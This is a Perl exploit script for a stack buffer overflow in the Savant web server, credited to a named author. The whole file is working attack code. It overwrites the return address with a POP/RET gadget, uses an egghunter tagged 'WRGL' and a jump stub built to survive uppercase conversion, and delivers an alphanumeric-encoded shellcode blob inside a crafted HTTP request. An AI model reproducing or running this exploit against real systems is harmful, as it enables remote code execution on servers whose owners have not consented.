#!/usr/bin/perl
# Savant Web server Stack corruption BoF exploit
# Written by Wireghoul - http://www.justanotherhacker.com

$EBP = "\xcc\xcc\xcc\xcc";
#$EIP = "AAAA";
$EIP = "\x36\xBB\xC1\x77"; #77C1BB36   POPRET
$eggh = "\xcc\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8".
"WRGL".
"\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7";
$dist = 248 - length($eggh);
$pad = "A" x $dist;
$shellcode = 
"\x89\xe2\xdb\xce\xd9\x72\xf4\x5a\x4a\x4a\x4a\x4a\x4a\x4a" .
"\x4a\x4a\x4a\x4a\x4a\x43\x43\x43\x43\x43\x43\x37\x52\x59" .
"\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41" .
"\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42" .
"\x75\x4a\x49\x49\x6c\x4a\x48\x4c\x49\x35\x50\x53\x30\x73" .
"\x30\x43\x50\x6d\x59\x6a\x45\x64\x71\x38\x52\x43\x54\x4c" .
"\x4b\x56\x32\x36\x50\x6c\x4b\x36\x32\x74\x4c\x6c\x4b\x76" .
"\x32\x76\x74\x4e\x6b\x42\x52\x71\x38\x66\x6f\x6c\x77\x42" .
"\x6a\x61\x36\x50\x31\x6b\x4f\x45\x61\x59\x50\x6c\x6c\x55" .
"\x6c\x35\x31\x71\x6c\x35\x52\x36\x4c\x77\x50\x6f\x31\x78" .
"\x4f\x56\x6d\x55\x51\x4a\x67\x49\x72\x78\x70\x51\x42\x70" .
"\x57\x4e\x6b\x76\x32\x36\x70\x4e\x6b\x63\x72\x67\x4c\x67" .
"\x71\x48\x50\x4c\x4b\x67\x30\x32\x58\x6c\x45\x69\x50\x72" .
"\x54\x72\x6a\x65\x51\x68\x50\x46\x30\x4c\x4b\x31\x58\x42" .
"\x38\x4e\x6b\x46\x38\x77\x50\x47\x71\x68\x53\x4a\x43\x67" .
"\x4c\x70\x49\x4c\x4b\x45\x64\x6c\x4b\x76\x61\x49\x46\x64" .
"\x71\x69\x6f\x50\x31\x4b\x70\x4e\x4c\x6b\x71\x68\x4f\x76" .
"\x6d\x47\x71\x68\x47\x45\x68\x6d\x30\x51\x65\x58\x74\x37" .
"\x73\x73\x4d\x6b\x48\x75\x6b\x61\x6d\x46\x44\x50\x75\x38" .
"\x62\x52\x78\x4c\x4b\x66\x38\x77\x54\x36\x61\x4a\x73\x43" .
"\x56\x6e\x6b\x56\x6c\x62\x6b\x6c\x4b\x56\x38\x45\x4c\x65" .
"\x51\x6a\x73\x6c\x4b\x33\x34\x6e\x6b\x76\x61\x58\x50\x4e" .
"\x69\x31\x54\x71\x34\x67\x54\x63\x6b\x73\x6b\x63\x51\x31" .
"\x49\x63\x6a\x52\x71\x6b\x4f\x59\x70\x30\x58\x71\x4f\x32" .
"\x7a\x6c\x4b\x66\x72\x78\x6b\x4f\x76\x61\x4d\x43\x5a\x35" .
"\x51\x4e\x6d\x6c\x45\x6f\x49\x77\x70\x65\x50\x73\x30\x30" .
"\x50\x50\x68\x35\x61\x6e\x6b\x32\x4f\x4d\x57\x79\x6f\x48" .
"\x55\x6d\x6b\x4a\x50\x38\x35\x69\x32\x71\x46\x33\x58\x4c" .
"\x66\x6e\x75\x4d\x6d\x6f\x6d\x69\x6f\x7a\x75\x45\x6c\x35" .
"\x56\x33\x4c\x64\x4a\x6b\x30\x69\x6b\x69\x70\x64\x35\x33" .
"\x35\x4d\x6b\x71\x57\x57\x63\x62\x52\x70\x6f\x62\x4a\x67" .
"\x70\x43\x63\x69\x6f\x48\x55\x51\x73\x72\x4d\x52\x44\x44" .
"\x6e\x61\x75\x64\x38\x65\x35\x35\x50\x41\x41";


$payload = "\x90\x7C\x18\x7D\x16 / "; # Nop jge 24 jl 22 jumps to egghunter using opcodes outside of the uppercase conversion range
$payload.="$eggh$pad$EBP$EIP\r\nUser-Agent: \xcc". "B" x 254 . "\r\n\r\nWRGLWRGL$shellcode";
print $payload;
